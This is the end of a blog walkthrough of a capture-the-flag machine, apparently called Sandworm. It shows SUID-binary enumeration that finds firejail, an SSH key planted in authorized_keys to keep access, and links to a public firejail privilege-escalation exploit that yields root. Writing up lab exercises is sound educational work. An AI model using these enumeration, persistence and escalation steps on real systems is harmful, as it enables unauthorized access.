</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=1000(atlas) <span style=color:#fb660a>gid</span>=1000(atlas) <span style=color:#fb660a>groups</span>=1000(atlas),1002(jailer)
</span></span></code></pre></div><p>Humm, weird, now we can run <code>find</code> command. I&rsquo;ve found a suid bin file &ldquo;firejail&rdquo;:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>atlas@sandworm:~/.ssh$ find / -perm -4000 -user root 2&gt;/dev/null | xargs -I{} ls -ltra {}
</span></span><span style=display:flex><span>&lt;<span style=color:#0086f7;font-weight:700>000</span> -user root 2&gt;/dev/null | xargs -I{} ls -ltra {}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>-rwsr-x--- <span style=color:#0086f7;font-weight:700>1</span> root jailer <span style=color:#0086f7;font-weight:700>1777952</span> Nov <span style=color:#0086f7;font-weight:700>29</span>  <span style=color:#0086f7;font-weight:700>2022</span> /usr/local/bin/firejail
</span></span><span style=display:flex><span>-rwsr-xr-- <span style=color:#0086f7;font-weight:700>1</span> root messagebus <span style=color:#0086f7;font-weight:700>35112</span> Oct <span style=color:#0086f7;font-weight:700>25</span>  <span style=color:#0086f7;font-weight:700>2022</span> /usr/lib/dbus-1.0/dbus-daemon-launch-helper
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#0086f7;font-weight:700>1</span> root root <span style=color:#0086f7;font-weight:700>338536</span> Nov <span style=color:#0086f7;font-weight:700>23</span>  <span style=color:#0086f7;font-weight:700>2022</span> /usr/lib/openssh/ssh-keysign
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#0086f7;font-weight:700>1</span> root root <span style=color:#0086f7;font-weight:700>18736</span> Feb <span style=color:#0086f7;font-weight:700>26</span>  <span style=color:#0086f7;font-weight:700>2022</span> /usr/libexec/polkit-agent-helper-1
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#0086f7;font-weight:700>1</span> root root <span style=color:#0086f7;font-weight:700>47480</span> Feb <span style=color:#0086f7;font-weight:700>21</span>  <span style=color:#0086f7;font-weight:700>2022</span> /usr/bin/mount
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#0086f7;font-weight:700>1</span> root root <span style=color:#0086f7;font-weight:700>232416</span> Apr  <span style=color:#0086f7;font-weight:700>3</span> 18:00 /usr/bin/sudo
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#0086f7;font-weight:700>1</span> root root <span style=color:#0086f7;font-weight:700>72072</span> Nov <span style=color:#0086f7;font-weight:700>24</span>  <span style=color:#0086f7;font-weight:700>2022</span> /usr/bin/gpasswd
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#0086f7;font-weight:700>1</span> root root <span style=color:#0086f7;font-weight:700>35192</span> Feb <span style=color:#0086f7;font-weight:700>21</span>  <span style=color:#0086f7;font-weight:700>2022</span> /usr/bin/umount
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#0086f7;font-weight:700>1</span> root root <span style=color:#0086f7;font-weight:700>59976</span> Nov <span style=color:#0086f7;font-weight:700>24</span>  <span style=color:#0086f7;font-weight:700>2022</span> /usr/bin/passwd
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#0086f7;font-weight:700>1</span> root root <span style=color:#0086f7;font-weight:700>44808</span> Nov <span style=color:#0086f7;font-weight:700>24</span>  <span style=color:#0086f7;font-weight:700>2022</span> /usr/bin/chsh
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#0086f7;font-weight:700>1</span> root root <span style=color:#0086f7;font-weight:700>72712</span> Nov <span style=color:#0086f7;font-weight:700>24</span>  <span style=color:#0086f7;font-weight:700>2022</span> /usr/bin/chfn
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#0086f7;font-weight:700>1</span> root root <span style=color:#0086f7;font-weight:700>40496</span> Nov <span style=color:#0086f7;font-weight:700>24</span>  <span style=color:#0086f7;font-weight:700>2022</span> /usr/bin/newgrp
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#0086f7;font-weight:700>1</span> root root <span style=color:#0086f7;font-weight:700>55672</span> Feb <span style=color:#0086f7;font-weight:700>21</span>  <span style=color:#0086f7;font-weight:700>2022</span> /usr/bin/su
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#0086f7;font-weight:700>1</span> root root <span style=color:#0086f7;font-weight:700>35200</span> Mar <span style=color:#0086f7;font-weight:700>23</span>  <span style=color:#0086f7;font-weight:700>2022</span> /usr/bin/fusermount3
</span></span></code></pre></div><p>Ok, just to have a better shell I put my ssh pub key under the user <code>atlas</code> and I login again:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>cat <span style=color:#0086d2>&lt;&lt;EOF &gt;&gt;~/.ssh/authorized_keys
</span></span></span><span style=display:flex><span><span style=color:#0086d2>ssh-rsa AAA.....
</span></span></span><span style=display:flex><span><span style=color:#0086d2>EOF</span>
</span></span></code></pre></div><p>Ok, so by gooling any CVE about <code>firejail</code>, I&rsquo;ve found this which provides a python script:
<a href=https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25>https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25</a>
which by the way is just a copy/paste without the headers &#x1f604; the original one is posted here:
<a href=https://www.openwall.com/lists/oss-security/2022/06/08/10/1>https://www.openwall.com/lists/oss-security/2022/06/08/10/1</a>
Finally, here the report:
<a href=https://www.openwall.com/lists/oss-security/2022/06/08/10>https://www.openwall.com/lists/oss-security/2022/06/08/10</a></p><figure class=image-container><a href=/i/2023-08-10_21-05.png><img width=100% src=/i/2023-08-10_21-05.png alt="got root"></a><figcaption>&#8213; got root &#8213;</figcaption></figure><h2 id=todos>TODOs
<a class=heading-link href=#todos><i class="fa fa-link" aria-hidden=true></i></a></h2><ul><li>Review the exploit report PoC in deepth</li></ul></article></section></div><footer class=footer><section class=container>©
2021 -
2024
Dennis Ruiz
·
Powered by <a href=https://gohugo.io/>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/>Coder</a>.</section></footer></main><script src=/js/coder.min.236049395dc3682fb2719640872958e12f1f24067bb09c327b233e6290c7edac.js integrity="sha256-I2BJOV3DaC+ycZZAhylY4S8fJAZ7sJwyeyM+YpDH7aw="></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-6CQZY8W0WD"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-6CQZY8W0WD")</script><script>$(document).on("input propertychange paste change",".FilterSearch",function(){var n=$(this).val().toLowerCase(),s=$(this).closest("ul"),t=s.find("li:gt(0)");t.hide(),t.filter(function(){var e=$(this).text().toLowerCase();return e.indexOf(n)>=0}).show()})</script></body></html>